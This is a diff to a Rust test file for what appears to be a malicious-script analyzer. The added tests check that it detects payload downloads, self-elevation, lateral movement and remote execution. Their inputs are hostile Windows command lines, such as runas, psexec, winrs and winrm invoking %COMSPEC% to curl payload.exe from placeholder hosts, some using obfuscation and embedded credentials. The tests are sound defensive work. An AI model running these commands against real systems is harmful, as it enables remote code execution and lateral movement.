@@ -2089,6 +2089,35 @@ start payload.chm"#;
     }
 
     #[test]
+    fn native_runas_replays_comspec_child_command() {
+        let script = br#"runas /user:Administrator "%COMSPEC% /V:ON /c set U=https://runas-comspec.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation { target, args }
+                    if target.eq_ignore_ascii_case("%COMSPEC%")
+                        && args
+                            .as_deref()
+                            .is_some_and(|value| value.contains("curl -o payload.exe"))
+            )),
+            "native runas COMSPEC SelfElevation not detected: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://runas-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "native runas COMSPEC child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn runas_savecred_emits_credential_access_trait() {
         let script = br#"runas /savecred /user:Administrator "cmd.exe /c whoami""#;
         let report = analyze(script, &AnalyzeConfig::default());
@@ -8672,6 +8701,32 @@ powershell -Command "gmo -ListAvailable"
     }
 
     #[test]
+    fn psexec_replays_remote_comspec_child() {
+        let script = br#"psexec \\target.example -u admin -p pass %COMSPEC% /V:ON /c set U=https://psexec-comspec.example/payload.exe&&curl -o payload.exe !U!"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://psexec-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "psexec COMSPEC remote child command was not analyzed: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::LateralMovement { tool, target_host }
+                    if tool == "psexec" && target_host == "target.example"
+            )),
+            "psexec COMSPEC lateral movement trait missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn psexec_slash_options_replay_remote_cmd_child() {
         let script = br#"psexec \\target.example /u admin /p pass /s cmd.exe /V:ON /c set U=https://psexec-slash-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
@@ -8760,6 +8815,32 @@ C:\Users\Public\ps.tmp \\target.example -u admin -p pass cmd.exe /V:ON /c set U=
     }
 
     #[test]
+    fn winrs_replays_remote_comspec_child() {
+        let script = br#"winrs -r:target.example %COMSPEC% /V:ON /c set U=https://winrs-comspec.example/payload.exe&&curl -o payload.exe !U!"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://winrs-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "winrs COMSPEC remote child command was not analyzed: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteExec { tool, target_host }
+                    if tool == "winrs" && target_host == "target.example"
+            )),
+            "winrs COMSPEC remote exec trait missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn copied_winrs_alias_replays_remote_cmd_child() {
         let script = br#"copy C:\Windows\System32\winrs.exe C:\Users\Public\wr.tmp
 C:\Users\Public\wr.tmp -r:target.example cmd.exe /V:ON /c set U=https://copied-winrs.example/payload.exe&&curl -o payload.exe !U!"#;
@@ -8817,6 +8898,32 @@ C:\Users\Public\wr.tmp -r:target.example cmd.exe /V:ON /c set U=https://copied-w
                     if tool == "winrm" && target_host == "target.example"
             )),
             "winrm remote exec trait missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn winrm_invoke_replays_remote_comspec_child() {
+        let script = br#"winrm invoke Create wmicimv2/Win32_Process -r:target.example @{CommandLine="%COMSPEC% /V:ON /c set U=https://winrm-comspec.example/payload.exe&&curl -o payload.exe !U!";CurrentDirectory="C:\Windows"}"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://winrm-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "winrm COMSPEC remote child command was not analyzed: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteExec { tool, target_host }
+                    if tool == "winrm" && target_host == "target.example"
+            )),
+            "winrm COMSPEC remote exec trait missing: {:?}",
             report.traits
         );
     }
